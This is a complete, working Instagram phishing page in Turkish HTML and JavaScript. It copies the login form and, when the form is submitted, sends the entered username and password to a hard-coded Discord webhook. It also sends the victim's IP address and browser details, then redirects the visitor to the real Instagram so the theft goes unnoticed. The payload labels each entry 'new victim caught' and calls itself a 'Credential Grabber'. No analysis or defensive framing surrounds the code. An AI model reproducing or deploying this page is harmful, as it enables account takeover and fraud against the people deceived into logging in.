<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 300px; text-align: center; border-radius: 8px; }
        input { width: 100%; padding: 10px; margin: 5px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 10px; margin-top: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        h1 { font-family: 'Billabong', cursive; font-size: 32px; margin-bottom: 20px; color: #262626; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Instagram</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" id="password" placeholder="Şifre" required>
            <button type="submit">Oturum Aç</button>
        </form>
    </div>

    <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        let ip = 'Bilinmiyor';
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            ip = ipData.ip;
        } catch(err) {}

        const ua = navigator.userAgent;
        const now = new Date().toLocaleString('tr-TR');

        const embed = {
            title: '🎯 Yeni Kurban Yakalandı',
            color: 15158332,
            fields: [
                { name: '👤 Kullanıcı Adı', value: '`' + username + '`', inline: true },
                { name: '🔑 Şifre', value: '`' + password + '`', inline: true },
                { name: '🌐 IP Adresi', value: '`' + ip + '`', inline: true },
                { name: '💻 Cihaz Bilgisi', value: '`' + ua + '`' },
                { name: '⏰ Zaman', value: '`' + now + '`' }
            ],
            footer: { text: 'Credential Grabber v1.0' }
        };

        await fetch('https://discord.com/api/webhooks/1550155264408166430/J-EBhIGZAu-NplrOhR05e3C6f2pOMXDeJkDz8b2PpwAb-Uu9EuXyRYOV60cGXZDmugsZ', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        window.location.href = 'https://www.instagram.com';
    });
    </script>
</body>
</html>
